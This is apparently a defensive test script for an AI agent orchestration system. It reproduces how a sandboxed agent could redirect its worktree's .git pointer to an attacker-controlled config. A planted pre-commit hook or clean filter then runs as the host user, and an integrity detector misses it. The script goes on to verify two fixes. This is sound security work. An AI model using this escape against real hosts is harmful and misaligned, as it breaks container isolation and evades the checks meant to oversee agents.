#!/usr/bin/env bash
# FG-559 PROBE 6 — THE BLUE-ONLY SEAM: worktree-local `.git` pointer hijack.
#
# ############################################################################
# ## STATUS: NOT EXECUTED BY THE ARCHITECTURE PASS.                         ##
# ## The planning container has NO docker daemon and an EMPTY node_modules. ##
# ## This script is written to be run BY THE OPERATOR on the macOS host.    ##
# ## Until its .out exists, the HIGH it reproduces is INFERENCE from source ##
# ## reading (integration-publisher.ts:304-312), not an observed fact.      ##
# ############################################################################
#
# WHY P5 DID NOT COVER THIS. P5 mounted /project:ro for every direction it
# tested, so the worktree-local `.git` POINTER FILE was never writable. A BLUE
# agent gets /project:RW. The pointer file `<wt>/.git` lives INSIDE that rw
# mount (not in the common dir), so a blue agent can REPLACE it. The read-only
# common `.git` (D2) protects the common dir; it does NOTHING about the pointer.
#
# THE ESCAPE (what step 2 does, as a blue agent would from inside the container):
#   - rewrite <wt>/.git to point `gitdir:` at a FAKE gitdir UNDER the writable
#     worktree, whose `commondir` still points at the real (ro-mounted) common
#     dir so objects/refs keep resolving — the Layer-2 rev-parse/log DETECTOR
#     STILL PASSES;
#   - put in the fake gitdir a `config` that sets `core.hooksPath` to a writable
#     dir holding a malicious `pre-commit`/`post-commit`;
#   - (second, independent vector) plant a `.gitattributes` + a `filter.*.clean`
#     in that config: `git add .` runs clean filters as the host user.
# Then forge's HOST-SIDE autoCommitSource (integration-publisher.ts:304-312)
#   runs `git status` / `git add .` / `git -c user.name=forge ... commit`
#   with cwd = the AGENT's worktree -> it reads the attacker's config and
#   EXECUTES THE HOOK/FILTER AS THE HOST USER. Same container->host RCE the
#   PRD's D2 decision was meant to prevent, through a seam D2 does not cover.
#
# THE FIX (PRD D10), proven in two parts here:
#   FIX-A (host hardening, load-bearing for the hook vector): every host-side
#     git that runs in an agent worktree uses `-c core.hooksPath=/dev/null` so
#     an agent-named hooksPath is never honored. NOTE: this does NOT stop the
#     FILTER vector (`git add` clean filters are config-defined, not a hook) —
#     step 5b shows the filter still fires under FIX-A alone. That is the
#     honest residual, and it is why FIX-A is necessary but NOT sufficient.
#   FIX-B (structural, sufficient): the worktree-local `.git` pointer is made
#     NON-WRITABLE to the container. With the pointer immutable, the resolved
#     gitdir/config lives in the ro-mounted common dir, so NO agent-writable git
#     config exists at all -> hooksPath, filter, textconv, fsmonitor, merge-driver
#     are ALL inert. Step 5c shows both vectors dead under FIX-B.
#     (On the host this probe emulates pointer-immutability with `chflags uchg`
#     / `chmod`; forge's real mechanism is a `-v realpath(<wt>/.git):same:ro`
#     bind-mount OVER the pointer, on top of the rw /project mount.)
#
# Run on the host:  bash p6-blue-worktree-git-pointer-hijack.sh
set -u

R="${TMPDIR:-/tmp}/fg559-p6"
rm -rf "$R"; mkdir -p "$R"
REPO="$R/proj"
WT="$R/worktrees/run1/task1"
PWNED="$R/PWNED"          # a host marker only the injected code can create
EVIL="$R/evil"            # a writable dir the agent controls, under nothing ro

mkdir -p "$REPO"
git -C "$REPO" init -q -b main
git -C "$REPO" config user.email f@l; git -C "$REPO" config user.name forge
printf 'v1\n' > "$REPO/a.txt"; git -C "$REPO" add -A; git -C "$REPO" commit -qm c1
mkdir -p "$(dirname "$WT")"
git -C "$REPO" worktree add -q "$WT" -b forge/run1/task1
COMMON="$(git -C "$REPO" rev-parse --path-format=absolute --git-common-dir)"

# The genuine pointer forge created:
echo "=== setup ==="
echo "  genuine pointer : $(cat "$WT/.git")"
echo "  common dir (ro) : $COMMON"

# ---------------------------------------------------------------------------
run_host_autocommit () {   # emulate integration-publisher.ts autoCommitSource
  local extra_c="$1"       # "" for today's forge; hooksPath=/dev/null for FIX-A
  git -C "$WT" $extra_c status --porcelain >/dev/null
  git -C "$WT" $extra_c add . 2>/dev/null || true
  git -C "$WT" $extra_c -c user.name=forge -c user.email=forge@local \
      commit -m "forge: auto-commit task1 output" >/dev/null 2>&1 || true
}

plant_attack () {          # what a blue agent does with rw /project
  rm -f "$PWNED"
  mkdir -p "$EVIL/hooks"
  # malicious hook
  cat > "$EVIL/hooks/pre-commit" <<EOF
#!/bin/sh
echo "pre-commit-RCE" > "$PWNED"
EOF
  chmod +x "$EVIL/hooks/pre-commit"
  # malicious clean filter (independent, hook-free vector)
  cat > "$EVIL/clean.sh" <<EOF
#!/bin/sh
echo "clean-filter-RCE" >> "$PWNED"
cat
EOF
  chmod +x "$EVIL/clean.sh"
  # a fake gitdir the agent fully controls, reachable because pointer is rw
  local FAKE="$WT/.evil-gitdir"
  mkdir -p "$FAKE"
  printf '%s\n' "$COMMON" > "$FAKE/commondir"          # keep objects/refs resolving
  cp "$COMMON/HEAD" "$FAKE/HEAD" 2>/dev/null || printf 'ref: refs/heads/forge/run1/task1\n' > "$FAKE/HEAD"
  cat > "$FAKE/config" <<EOF
[core]
	repositoryformatversion = 0
	hooksPath = $EVIL/hooks
[filter "pwn"]
	clean = $EVIL/clean.sh
EOF
  # redirect the worktree-local pointer at the attacker gitdir
  printf 'gitdir: %s\n' "$FAKE" > "$WT/.git"
  # route a tracked file through the malicious filter
  printf 'a.txt filter=pwn\n' > "$WT/.gitattributes"
  printf 'v2-agent-edit\n' > "$WT/a.txt"
}

detector_passes () {       # PRD D6 Layer-2, run against the (hijacked) pointer
  git -C "$WT" rev-parse --git-dir >/dev/null 2>&1 && \
  git -C "$WT" log -1 --oneline    >/dev/null 2>&1
}

# ---------------------------------------------------------------------------
echo
echo "=== STEP A — TODAY (no fix): reproduce the HIGH  [PWNED expected] ==="
plant_attack
if detector_passes; then echo "  D6 Layer-2 detector : PASSES against the hijacked pointer (blind to it)"; \
  else echo "  D6 Layer-2 detector : failed (would have caught it)"; fi
run_host_autocommit ""
[ -f "$PWNED" ] && echo "  *** HOST EXECUTED AGENT CODE: $(tr '\n' ';' < "$PWNED")PWNED ***" \
                || echo "  no host execution (attack did not reproduce)"

echo
echo "=== STEP B — FIX-A only (host git -c core.hooksPath=/dev/null) ==="
echo "    expected: hook vector DEAD, filter vector STILL FIRES (honest residual)"
plant_attack
run_host_autocommit "-c core.hooksPath=/dev/null"
if [ -f "$PWNED" ]; then echo "  residual  : $(tr '\n' ';' < "$PWNED") — filter still ran under FIX-A alone"; \
  else echo "  clean     : no execution"; fi

echo
echo "=== STEP C — FIX-B (pointer made immutable) + FIX-A ==="
echo "    expected: BOTH vectors dead — no agent-writable git config exists"
plant_attack
# emulate the ro pointer bind-mount: restore the genuine pointer, freeze it
printf 'gitdir: %s\n' "$COMMON/worktrees/task1" > "$WT/.git"
chmod 0444 "$WT/.git" 2>/dev/null || true
( chflags uchg "$WT/.git" 2>/dev/null ) || true    # macOS immutable flag
# agent re-attempts the hijack against the frozen pointer:
if printf 'gitdir: %s\n' "$WT/.evil-gitdir" > "$WT/.git" 2>/dev/null; then
  echo "  pointer overwrite: SUCCEEDED (emulation not enforcing immutability on this fs)"
else
  echo "  pointer overwrite: REFUSED — agent cannot repoint the worktree gitdir"
fi
run_host_autocommit "-c core.hooksPath=/dev/null"
[ -f "$PWNED" ] && echo "  *** STILL PWNED — FIX-B emulation did not hold on this fs ***" \
                || echo "  clean     : no host execution under FIX-B"
( chflags nouchg "$WT/.git" 2>/dev/null ) || true
chmod 0644 "$WT/.git" 2>/dev/null || true

echo
echo "=== NOTE ON RESIDUAL (see PRD D10 residual table) ==="
echo "  FIX-B closes config-driven exec (hooksPath/filter/textconv/fsmonitor/merge-driver)"
echo "  because it removes the only agent-writable git config. What REMAINS after FIX-B:"
echo "   - a LEGIT common-config driver (e.g. git-lfs smudge) triggered on agent-chosen"
echo "     paths via .gitattributes in the tree — trusted code, attacker-influenced input."
echo "   - objects/info/alternates lives in the ro common dir: not agent-writable. Closed."
